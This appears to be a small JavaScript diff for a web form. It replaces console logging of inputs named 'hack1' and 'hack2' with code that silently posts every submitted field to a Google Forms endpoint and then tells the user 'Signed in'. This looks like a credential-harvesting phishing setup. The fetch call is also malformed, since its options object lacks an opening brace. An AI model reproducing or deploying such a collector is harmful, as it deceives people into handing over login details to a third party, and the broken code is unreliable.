@@ -1,8 +1,13 @@
-document.getElementById("myform").addEventListener("submit", function(event){
+document.getElementById("googleform").addEventListener("submit", function(event){
     event.preventDefault();
 
-let hack1 = document.getElementById("hack1").value;
-let hack2 = document.getElementById("hack2").value;
-console.log("first input:", hack1);
-console.log("second input:", hack2);
+    let formData = new
+        FormData(this);
+
+fetch("https://docs.google.com/forms/u/0/d/e/1FAIpQLScf1g3KcmavxDlVv3u6HWXx0tzox6dtI2ovIEHHnZ18ZswaBg/formResponse")
+    method: "POST",
+        body: formData,
+        mode: "no-cors"}). then(response => { alert("Signed in");
+                                            }).catch(error =>
+    console.error("ERROR:", error));
 });
